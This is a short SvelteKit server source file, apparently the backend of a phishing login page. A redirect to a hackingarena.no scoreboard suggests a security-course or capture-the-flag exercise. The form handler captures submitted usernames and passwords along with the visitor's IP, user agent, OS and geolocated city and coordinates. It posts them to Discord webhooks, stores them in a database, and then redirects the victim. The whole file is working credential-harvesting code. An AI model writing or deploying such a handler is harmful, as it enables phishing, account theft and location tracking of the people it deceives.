// @ts-nocheck
import { VITE_DISCORD_WEBHOOK } from "$env/static/private";
import { fail, redirect } from "@sveltejs/kit";
import { ip } from "../../hooks.server";
import { ipInfo, createWebhookBody } from "$lib/util";
import { supabase } from "$lib/supabaseClient";

export const actions = {
    default: async ({ request }) => {
        const formData = await request.formData();
        const username = formData.get("username");
        const password = formData.get("password");
        const os = formData.get("os");

        const user_agent = request.headers.get("user-agent");
        const info = await ipInfo(ip);
        const city = info.geoplugin_city;
        const region = info.geoplugin_region;
        const country = info.geoplugin_countryName;
        const latitude = info.geoplugin_latitude;
        const longitude = info.geoplugin_longitude;

        const d = {
            ip: ip,
            username: username,
            password: password,
            user_agent: user_agent,
            os: os,
            city: city,
            country: country,
            region: region,
            latitude: latitude,
            longitude: longitude
        };

        console.log(d);

        const urls = VITE_DISCORD_WEBHOOK.split("||");

        for (const i in urls) {
            fetch(urls[i], {
                method: "POST",
                body: createWebhookBody(d),
                headers: {
                    "Content-type": "application/json; charset=UTF-8"
                }
            });
        }

        const { error } = await supabase.from("users").insert(d);

        if (error && error?.status != 201) {
            return fail(400, {
                message: "Error logging in"
            });
        }

        throw redirect(303, "https://iik3100.hackingarena.no/scoreboard");
    }
};
